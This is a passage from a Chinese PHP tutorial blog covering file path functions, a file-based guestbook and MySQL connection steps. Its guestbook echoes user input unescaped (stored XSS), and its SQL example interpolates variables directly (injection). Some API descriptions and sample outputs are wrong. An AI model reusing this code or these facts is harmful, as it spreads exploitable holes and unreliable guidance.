</tr>
<tr>
<td align="center">chgrp</td>
<td align="left">修改用户组</td>
</tr>
<tr>
<td align="center">chown</td>
<td align="left">修改权限</td>
</tr>
</tbody></table>
<blockquote>
<p>上面的函数用法与linux的权限操作的用法一样。</p>
</blockquote>
<p>&amp;emsp;<br>chmod 主要是修改文件的的权限</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//修改linux  系统/var/wwwroot/某文件权限为755</span></span><br><span class="line">chmod(<span class="string">&quot;/var/wwwroot/index.html&quot;</span>, <span class="number">755</span>);  </span><br><span class="line">chmod(<span class="string">&quot;/var/wwwroot/index.html&quot;</span>, <span class="string">&quot;u+rwx,go+rx&quot;</span>); </span><br><span class="line">chmod(<span class="string">&quot;/somedir/somefile&quot;</span>, <span class="number">0755</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="十-文件路径函数"><a href="#十-文件路径函数" class="headerlink" title="十. 文件路径函数"></a><font color="#FF6347" face="Comic sans MS">十. 文件路径函数</font></h3><blockquote>
<p><font color="#FF7F00"><strong>我们经常会遇到处理文件路径的情况。</strong></font></p>
</blockquote>
<ol>
<li>文件后缀需要取出来</li>
<li>路径需要取出名字不取目录</li>
<li>只需要取出路径名中的目录路径</li>
<li>或者把网址中的各个部份进行解析取得独立值</li>
<li>甚至是自己组成一个url出来<br>……</li>
</ol>
<p>&amp;emsp;<br>常用路径处理函数：</p>
<table>
<thead>
<tr>
<th align="center">函数名</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">pathinfo()</td>
<td align="left">返回文件的各个组成部份</td>
</tr>
<tr>
<td align="center">basename()</td>
<td align="left">返回文件名</td>
</tr>
<tr>
<td align="center">dirname()</td>
<td align="left">文件目录部份</td>
</tr>
<tr>
<td align="center">parse_url()</td>
<td align="left">网址拆解成各部份</td>
</tr>
<tr>
<td align="center">http_build_query()</td>
<td align="left">生成url 中的query字符串</td>
</tr>
<tr>
<td align="center">http_build_url()</td>
<td align="left">生成一个url</td>
</tr>
</tbody></table>
<p>&amp;emsp;</p>
<h4 id="10-1-pathinfo-函数"><a href="#10-1-pathinfo-函数" class="headerlink" title="10.1 pathinfo()函数"></a><font color="#3CB371" face="Comic sans MS">10.1 pathinfo()函数</font></h4><blockquote>
<p><font color="#FF7F00"><strong>功能：以关联数组的形式返回文件路径的信息</strong></font></p>
</blockquote>
<p><font color="#00B2EE"><strong>pathinfo(path,options)</strong></font></p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">path</td>
<td align="left">必需。规定要检查的路径。&amp;emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_filesystem_pathinfo.asp">PHP pathinfo() 函数</a>]</font></td>
</tr>
<tr>
<td align="center">process_sections</td>
<td align="left">可选。规定要返回的数组元素。默认是 all。<br>可能的值：<br>PATHINFO_DIRNAME - 只返回 dirname<br>PATHINFO_BASENAME - 只返回 basename<br>PATHINFO_EXTENSION - 只返回 extension</td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$path_parts</span> = pathinfo(<span class="string">&#x27;d:/www/index.inc.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;文件目录名：&#x27;</span>.<span class="variable">$path_parts</span>[<span class="string">&#x27;dirname&#x27;</span>].<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;文件全名：&#x27;</span>.<span class="variable">$path_parts</span>[<span class="string">&#x27;basename&#x27;</span>].<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;文件扩展名：&#x27;</span>.<span class="variable">$path_parts</span>[<span class="string">&#x27;extension&#x27;</span>].<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;不包含扩展的文件名：&#x27;</span>.<span class="variable">$path_parts</span>[<span class="string">&#x27;filename&#x27;</span>].<span class="string">&quot;&lt;br /&gt;&quot;</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">结果如下：</span><br><span class="line">文件目录名：d:/www</span><br><span class="line">文件全名：lib.inc.php</span><br><span class="line">文件扩展名：php</span><br><span class="line">不包含扩展的文件名：lib.inc</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;</p>
<h4 id="10-2-basename-函数"><a href="#10-2-basename-函数" class="headerlink" title="10.2 basename()函数"></a><font color="#3CB371" face="Comic sans MS">10.2 basename()函数</font></h4><blockquote>
<p><font color="#FF7F00"><strong>功能：返回路径中不带有文件扩展名的文件名</strong></font></p>
</blockquote>
<p><font color="#00B2EE"><strong>basename(path[,suffix])</strong></font></p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">path</td>
<td align="left">必需。规定要检查的路径。&amp;emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_filesystem_basename.asp">PHP basename() 函数</a>]</font></td>
</tr>
<tr>
<td align="center">suffix</td>
<td align="left">可选。指定文件名到了指定字符停止。</td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;1: &quot;</span>.basename(<span class="string">&quot;d:/www/index.d&quot;</span>, <span class="string">&quot;.d&quot;</span>).PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;2: &quot;</span>.basename(<span class="string">&quot;d:/www/index.php&quot;</span>).PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;3: &quot;</span>.basename(<span class="string">&quot;d:/www/passwd&quot;</span>).PHP_EOL;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">执行结果如下</span><br><span class="line"><span class="number">1</span>: index</span><br><span class="line"><span class="number">2</span>: index.php</span><br><span class="line"><span class="number">3</span>: passwd</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;</p>
<h4 id="10-3-dirname-函数"><a href="#10-3-dirname-函数" class="headerlink" title="10.3 dirname()函数"></a><font color="#3CB371" face="Comic sans MS">10.3 dirname()函数</font></h4><blockquote>
<p><font color="#FF7F00"><strong>功能：返回文件路径的文件目录部份,不包含文件名。</strong></font></p>
</blockquote>
<p><font color="#00B2EE"><strong>dirname(path)</strong></font></p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">path</td>
<td align="left">必需。规定要检查的路径。&amp;emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_filesystem_dirname.asp">PHP dirname() 函数</a>]</font></td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> dirname(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">执行结果如下</span><br><span class="line">G:\WAMP\www</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;</p>
<h4 id="10-4-parse-url-函数"><a href="#10-4-parse-url-函数" class="headerlink" title="10.4 parse_url()函数"></a><font color="#3CB371" face="Comic sans MS">10.4 parse_url()函数</font></h4><blockquote>
<p><font color="#FF7F00"><strong>功能：将网址拆解成各个部份，返回一个数组</strong></font></p>
</blockquote>
<p><font color="#00B2EE"><strong>mixed parse_url ( string $路径 )</strong></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://username:password@hostname:9090/path?arg=value#anchor&#x27;</span>;</span><br><span class="line"></span><br><span class="line">var_dump(parse_url(<span class="variable">$url</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">结果如下：</span><br><span class="line"><span class="keyword">array</span>(<span class="number">8</span>) &#123;</span><br><span class="line">[<span class="string">&quot;scheme&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;http&quot;</span></span><br><span class="line">[<span class="string">&quot;host&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;hostname&quot;</span></span><br><span class="line">[<span class="string">&quot;port&quot;</span>]=&gt; <span class="keyword">int</span>(<span class="number">9090</span>)</span><br><span class="line">[<span class="string">&quot;user&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;username&quot;</span></span><br><span class="line">[<span class="string">&quot;pass&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;password&quot;</span></span><br><span class="line">[<span class="string">&quot;path&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;/path&quot;</span></span><br><span class="line">[<span class="string">&quot;query&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;arg=value&quot;</span></span><br><span class="line">[<span class="string">&quot;fragment&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;anchor&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;</p>
<h4 id="10-5-http-build-query-函数"><a href="#10-5-http-build-query-函数" class="headerlink" title="10.5 http_build_query()函数"></a><font color="#3CB371" face="Comic sans MS">10.5 http_build_query()函数</font></h4><blockquote>
<p><font color="#FF7F00"><strong>功能：生成url 中的query字符串</strong></font></p>
</blockquote>
<p><font color="#00B2EE"><strong>string http_build_query ( mixed $需要处理的数据)</strong></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//定义一个关联数组</span></span><br><span class="line"><span class="variable">$data</span> = [</span><br><span class="line">       <span class="string">&#x27;username&#x27;</span>=&gt;<span class="string">&#x27;php&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;area&#x27;</span>=&gt;<span class="string">&#x27;hubei&#x27;</span></span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line"><span class="comment">//生成query内容</span></span><br><span class="line"><span class="keyword">echo</span> http_build_query(<span class="variable">$data</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">结果如下：</span><br><span class="line">username=php&amp;area=hubei</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注：</strong>PHP_EOL 常量<br>在 windows平台相当于 echo “\r\n”;<br>在unix\linux平台相当于 echo “\n”;<br>在mac平台相当于 echo “\r”;</p>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="十一-文件系统实例案例"><a href="#十一-文件系统实例案例" class="headerlink" title="十一. 文件系统实例案例"></a><font color="#FF6347" face="Comic sans MS">十一. 文件系统实例案例</font></h3><h4 id="11-1-文件留言本"><a href="#11-1-文件留言本" class="headerlink" title="11.1 文件留言本"></a><font color="#3CB371" face="Comic sans MS">11.1 文件留言本</font></h4><p>先来说两个下面用到的两个字符串函数和一个数组函数：</p>
<p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_string_trim.asp"><strong>trim()函数</strong></a>]</font>：<strong>移除字符串两侧的空白字符或其他预定义字符。</strong><br><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_string_explode.asp"><strong>explode()函数</strong></a>]</font><strong>：把字符串打散为数组。</strong><br><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_array_each.asp"><strong>each()函数</strong></a>]</font><strong>：返回当前元素的键名和键值。该元素的键名和键值返回到带有四个元素的数组中。</strong></p>
<p><font color="#FF7F00"></font></p>
<p>&amp;emsp;<br><font color="#00B2EE">[<a href="http://www.php.cn/code/4934.html"><strong>视频教程</strong></a>]</font></p>
<blockquote>
<p><font color="#FF7F00"><strong>1. 文件结构：</strong></font><br>index.php —展示输入框和留言内容,并将内容提交到write.php；<br>write.php —接收并处理来自index.php的内容，然后向message.txt写入数据；<br>message.txt —接收并存入来自write.php的聊天内容。</p>
</blockquote>
<p>index.php文件：<br><font color="#FF7F00"></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?Php</span></span><br><span class="line"><span class="comment">//设置时区</span></span><br><span class="line">date_default_timezone_set(<span class="string">&#x27;PRC&#x27;</span>);</span><br><span class="line"><span class="comment">//读了内容</span></span><br><span class="line">@<span class="variable">$string</span> = file_get_contents(<span class="string">&#x27;message.txt&#x27;</span>);</span><br><span class="line"><span class="comment">//如果$string 不为空的时候执行，也就是message.txt中有留言数据</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$string</span>)) &#123;</span><br><span class="line">    <span class="comment">//每一段留言有一个分格符，但是最后多出了一个&amp;^。因此，我们要将&amp;^删掉</span></span><br><span class="line">    <span class="variable">$string</span> = rtrim(<span class="variable">$string</span>, <span class="string">&#x27;&amp;^&#x27;</span>);</span><br><span class="line">    <span class="comment">//以&amp;^切成数组</span></span><br><span class="line">    <span class="variable">$arr</span> = explode(<span class="string">&#x27;&amp;^&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">    <span class="comment">//将留言内容读取</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="comment">//将用户名和内容分开</span></span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$username</span>, <span class="variable">$content</span>, <span class="variable">$time</span>) = explode(<span class="string">&#x27;$#&#x27;</span>, <span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;用户名为&lt;font color=&quot;gree&quot;&gt;&#x27;</span> . <span class="variable">$username</span> . <span class="string">&#x27;&lt;/font&gt;内容为&lt;font color=&quot;red&quot;&gt;&#x27;</span> . <span class="variable">$content</span> . <span class="string">&#x27;&lt;/font&gt;时间为&#x27;</span> . date(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>, <span class="variable">$time</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr /&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;h1&gt;基于文件的留言本演示&lt;/h1&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;write.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    用户名：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> /&gt;&lt;br /&gt;</span><br><span class="line">    留言内容：&lt;textarea  name=<span class="string">&quot;content&quot;</span>&gt;&lt;/textarea&gt;&lt;br /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>write.php文件：<br><font color="#FF7F00"></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//追加方式打开文件</span></span><br><span class="line"><span class="variable">$fp</span>=fopen(<span class="string">&#x27;message.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置时间</span></span><br><span class="line"><span class="variable">$time</span>=time();</span><br><span class="line"></span><br><span class="line"><span class="comment">//得到用户名</span></span><br><span class="line"><span class="variable">$username</span>=trim(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="comment">//得到内容</span></span><br><span class="line"><span class="variable">$content</span>=trim(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//组合写入的字符串：内容和用户之间分开，使用$#</span></span><br><span class="line"><span class="comment">//行与行之间分开，使用&amp;^</span></span><br><span class="line"><span class="variable">$string</span>=<span class="variable">$username</span>.<span class="string">&#x27;$#&#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;$#&#x27;</span>.<span class="variable">$time</span>.<span class="string">&#x27;&amp;^&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//写入文件</span></span><br><span class="line">fwrite(<span class="variable">$fp</span>,<span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭文件</span></span><br><span class="line">fclose(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;location:index.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font color="#00B2EE"><strong>步骤1：</strong></font><strong>在www目录下的index.php里面复制上面相对应的内容、新建一个write.php文件并复制相应的内容、新建一个message.txt空文件；</strong><br><font color="#00B2EE"><strong>步骤2：</strong></font><strong>运行index.php如下：</strong></p>
<p><img data-src="https://i.loli.net/2019/02/21/5c6e21be78910.png" alt="Hash函数.png"></p>
<p>&amp;emsp;<br><font color="#00B2EE"><strong>步骤3：</strong></font><strong>向留言框输入文字并点击提交</strong></p>
<p>&amp;emsp;</p>
<h4 id="11-2-修改配置文件"><a href="#11-2-修改配置文件" class="headerlink" title="11.2 修改配置文件"></a><font color="#3CB371" face="Comic sans MS">11.2 修改配置文件</font></h4><p><font color="#00B2EE">[<a href="http://www.php.cn/code/4935.html"><strong>视频教程</strong></a>]</font><br>&amp;emsp;</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP语言</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP操作MySQL数据库</title>
    <url>/post/PHP-MySQL/</url>
    <content><![CDATA[<p>😁</p>
<span id="more"></span>
<p>&amp;ensp;<br>&amp;ensp;</p>
<center><font color="#00B2EE" face="Comic sans MS" size=5>PHP操作MySQL数据库</font></center>



<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="一-数据库连接步骤"><a href="#一-数据库连接步骤" class="headerlink" title="一. 数据库连接步骤"></a><font color="#FF6347" face="Comic sans MS">一. 数据库连接步骤</font></h3><p>将数据库连接整理成了最重要的<font color="#FF7F00"><strong>8个步骤</strong></font>，我戏称它为：“数据库连接天龙八步”。😊  (。・∀・)ノ</p>
<p>&amp;emsp;</p>
<h4 id="第一步-连接数据库服务器"><a href="#第一步-连接数据库服务器" class="headerlink" title="第一步:  连接数据库服务器"></a><font color="#3CB371" face="Comic sans MS">第一步:  连接数据库服务器</font></h4><p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_mysql_connect.asp">PHP mysql_connect() 函数</a>]</font></p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">函数</td>
<td align="left">mysqli_connect()</td>
</tr>
<tr>
<td align="center">函数原型</td>
<td align="left">mysql_connect(server,user,pwd,newlink,clientflag)</td>
</tr>
<tr>
<td align="center">功能</td>
<td align="left">连接到mysql数据库服务器</td>
</tr>
<tr>
<td align="center">返回值</td>
<td align="left">如果成功，则返回一个 MySQL 连接标识，失败则返回 FALSE。</td>
</tr>
<tr>
<td align="center">参数1</td>
<td align="left">主机</td>
</tr>
<tr>
<td align="center">参数2</td>
<td align="left">数据库服务器登陆名</td>
</tr>
<tr>
<td align="center">参数3</td>
<td align="left">密码</td>
</tr>
<tr>
<td align="center">参数4</td>
<td align="left">数据库的名称</td>
</tr>
<tr>
<td align="center">参数5</td>
<td align="left">数据库服务器端口不填默认3306</td>
</tr>
</tbody></table>
<blockquote>
<p><font color="#FF7F00"><strong>对于参数4，数据库名称在此步已填并择，不需要执行第三步。</strong></font></p>
</blockquote>
<p>&amp;emsp;</p>
<h4 id="第二步-判断错误"><a href="#第二步-判断错误" class="headerlink" title="第二步:  判断错误"></a><font color="#3CB371" face="Comic sans MS">第二步:  判断错误</font></h4><p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_mysql_errno.asp">PHP mysqli_errno() 函数</a>]</font></p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">函数</td>
<td align="left">mysqli_errno(connection)</td>
</tr>
<tr>
<td align="center">功能&#x2F;返回值</td>
<td align="left">返回连接错误号，无错误返回0</td>
</tr>
<tr>
<td align="center">参数1</td>
<td align="left">传入mysqli_connect()返回的资源可选。规定 SQL 连接标识符。如果未规定，则使用上一个<br>打开的连接。</td>
</tr>
</tbody></table>
<p>&amp;emsp;<br><font color="#FF7F00"><strong>如果mysqli_errno()函数返回错误号，则用mysqli_error()显示文本错误信息。</strong></font>&amp;emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_mysql_error.asp">PHP mysql_error() 函数</a>]</font></p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">函数</td>
<td align="left">mysqli_error(connection)</td>
</tr>
<tr>
<td align="center">功能&#x2F;返回值</td>
<td align="left">返回连接错误字符串，如果没有出错则返回 ‘’（空字符串）</td>
</tr>
<tr>
<td align="center">参数1</td>
<td align="left">传入mysqli_connect返回的资源</td>
</tr>
</tbody></table>
<p>&amp;emsp;</p>
<h4 id="第三步-选择数据库"><a href="#第三步-选择数据库" class="headerlink" title="第三步:  选择数据库"></a><font color="#3CB371" face="Comic sans MS">第三步:  选择数据库</font></h4><p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_mysql_select_db.asp">PHP mysqli_select_db() 函数</a>]</font></p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">函数</td>
<td align="left">mysql_selecti_db(connection,database)</td>
</tr>
<tr>
<td align="center">返回值</td>
<td align="left">如果成功，则该函数返回 true。如果失败，则返回 false。</td>
</tr>
<tr>
<td align="center">功能</td>
<td align="left">选择本连接中的<strong>数据库</strong></td>
</tr>
<tr>
<td align="center">参数1</td>
<td align="left">传入mysqli_connect返回的资源</td>
</tr>
<tr>
<td align="center">参数2</td>
<td align="left">需要连接的数据库名</td>
</tr>
</tbody></table>
<blockquote>
<p><font color="#FF7F00"><strong>若在第一步已填数据库，不需要更换成其他数据库，则不需要执行第三步。</strong></font></p>
</blockquote>
<p>&amp;emsp;</p>
<h4 id="第四步-设置字符集"><a href="#第四步-设置字符集" class="headerlink" title="第四步:  设置字符集"></a><font color="#3CB371" face="Comic sans MS">第四步:  设置字符集</font></h4><p><font color="#00B2EE">[<a href="http://www.runoob.com/php/func-mysqli-set-charset.html">PHP mysqli_set_charset 函数</a>]</font></p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">函数</td>
<td align="left">mysqli_set_charset(connection,charset)</td>
</tr>
<tr>
<td align="center">功能</td>
<td align="left">设置与mysql服力器连接，结果，校验字符集</td>
</tr>
<tr>
<td align="center">返回值</td>
<td align="left">无返回值</td>
</tr>
<tr>
<td align="center">参数1</td>
<td align="left">传入mysqli_connect返回的资源</td>
</tr>
<tr>
<td align="center">参数2</td>
<td align="left">字符集类型</td>
</tr>
</tbody></table>
<p>&amp;emsp;</p>
<h4 id="第五步-准备SQL语句"><a href="#第五步-准备SQL语句" class="headerlink" title="第五步:  准备SQL语句"></a><font color="#3CB371" face="Comic sans MS">第五步:  准备SQL语句</font></h4><p><font color="#FF7F00"><strong>其实就是一个SQL语句的字符串，用于对MySQL数据库的操作。这一步很重要！</strong></font> </p>
<p>&amp;emsp;<br>例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into user(username,password) values(&#x27;<span class="subst">$username</span>&#x27;,&#x27;<span class="subst">$password</span>&#x27;)&quot;</span>;</span><br><span class="line"><span class="variable">$con</span> = mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;peter&quot;</span>,<span class="string">&quot;abc123&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . mysql_error());</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// some code</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<ol>
<li>我们通常要把变量赋值在SQL语句中使用。可是变量或者SQL语句出错了，非常不好排查。</li>
<li>我们根据实际工作经验增加了这一步。</li>
<li>如果在执行此步的时候报错了，我们可以把SQL语句打印出来，粘贴到phpMyAdmin或者相关工具中。</li>
<li>排错时，如果执行成功就说明不是SQL语句的问题。如果执行失败，请仔细检查SQL语句。</li>
</ol>
</blockquote>
<p>&amp;emsp;</p>
<h4 id="第六步-发送SQL语句"><a href="#第六步-发送SQL语句" class="headerlink" title="第六步:  发送SQL语句"></a><font color="#3CB371" face="Comic sans MS">第六步:  发送SQL语句</font></h4><p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_mysql_query.asp">PHP mysqli_query() 函数</a>]</font></p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">功能</td>
<td align="left">发送SQL语句,执行一条 MySQL 查询。</td>
</tr>
<tr>
<td align="center">返回值</td>
<td align="left">mysqli_query() 仅对 SELECT，SHOW，EXPLAIN 或 DESCRIBE 语句<strong>返回一个资源标识符</strong>，<br>如果查询执行不正确则返回 FALSE。</td>
</tr>
<tr>
<td align="center">参数1</td>
<td align="left">传入mysqli_connect返回的资源</td>
</tr>
<tr>
<td align="center">参数2</td>
<td align="left">传入发送的SQL语句。注意：查询字符串不应以分号结束。</td>
</tr>
</tbody></table>
<blockquote>
<ol>
<li>SQL语句准备完成，需要通过mysqli_query将SQL语句发送给MySQL服务器。</li>
<li>MySQL服务器会执行发送过来的SQL语句进行执行。</li>
</ol>
</blockquote>
<p>&amp;emsp;</p>
<h4 id="第七步-判断是否执行正常或者遍历数据"><a href="#第七步-判断是否执行正常或者遍历数据" class="headerlink" title="第七步:  判断是否执行正常或者遍历数据"></a><font color="#3CB371" face="Comic sans MS">第七步:  判断是否执行正常或者遍历数据</font></h4><p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_mysql_fetch_array.asp">PHP mysqli_fetch_array() 函数</a>]</font><br>读取第6步中，发送的是select类别的语句，<font color="#FF7F00"><strong>通常需要将结果以数组形式输出显示出来</strong></font>。就需要用到遍历显示数据的函数。</p>
<p><font color="red"></font></p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">函数</td>
<td align="left">mysqli_fetch_array(data,array_type)</td>
</tr>
<tr>
<td align="center">功能</td>
<td align="left">得到result结果集中的数据，返回数组进行遍历</td>
</tr>
<tr>
<td align="center">参数1</td>
<td align="left">可选。规定要使用的数据指针。该数据指针是 mysqli_query() 函数产生的结果。</td>
</tr>
<tr>
<td align="center">参数2</td>
<td align="left">可选。规定返回哪种结果。可能的值：<br>MYSQL_ASSOC - 关联数组<br>MYSQL_NUM - 数字数组<br>MYSQL_BOTH - 默认。同时产生关联和数字数组</td>
</tr>
</tbody></table>
<p>&amp;emsp;<br>下面举例几个常用的<strong>将mysqli_query()查询得到的字符串处理成数组的函数</strong>…….</p>
<p><font color="red"></font></p>
<table>
<thead>
<tr>
<th align="center">函数</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">mysqli_fetch_assoc(data)</td>
<td align="left">返回根据从结果集取得的行生成的<strong>关联数组</strong>，如果没有更多行，则返回 false</td>
</tr>
<tr>
<td align="center">mysqli_fetch_row(data)</td>
<td align="left">返回根据从结果集取得的行生成的<strong>索引数组</strong>，如果没有更多行，则返回 false</td>
</tr>
<tr>
<td align="center">mysqli_fetch_object(data)</td>
<td align="left">从结果集（记录集）中取得一行作为对象。<br>若成功的话，本函数从 mysql_query() 获得一行，并返回一个对象。如果失败<br>或没有更多的行，则返回 false。</td>
</tr>
<tr>
<td align="center">mysqli_num_rows(data)</td>
<td align="left">返回结果集中行的数目。此命令仅对 SELECT 语句有效。<br>要取得被 INSERT，UPDATE 或者 DELETE 查询所影响到的行的数目，<br>用 mysqli_affected_rows()。</td>
</tr>
<tr>
<td align="center">mysqli_fetch_field</td>
<td align="left">从结果集中取得列信息并作为对象返回。</td>
</tr>
</tbody></table>
<p>&amp;emsp;</p>
<h4 id="第八步-关闭数据库"><a href="#第八步-关闭数据库" class="headerlink" title="第八步:  关闭数据库"></a><font color="#3CB371" face="Comic sans MS">第八步:  关闭数据库</font></h4><p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_mysql_close.asp">PHP mysql_close() 函数</a>]</font></p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">函数</td>
